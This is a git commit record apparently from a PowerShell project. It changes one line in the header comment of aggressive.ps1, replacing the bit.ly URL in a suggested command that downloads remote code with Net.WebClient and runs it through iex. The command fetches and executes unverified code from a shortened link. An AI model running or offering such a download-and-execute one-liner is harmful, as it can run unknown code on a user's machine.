3df209771283c17f968f2a3d71961876bff8ba49
Anandhu Prakash <71215529+codemoxy@users.noreply.github.com>
2020-10-17 12:41:19 +0530

    Update aggressive.ps1

--- aggressive.ps1
+++ aggressive.ps1
@@ -12,7 +12,7 @@
 #
 #	Addition: One command to rule them all, One command to find it, and One command to Run it! 
 #
-#     > powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://bit.ly/37dYUv0')"
+#     > powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://bit.ly/3dzpJdU')"
 #
 #	Code Moxy's Addition:
 #
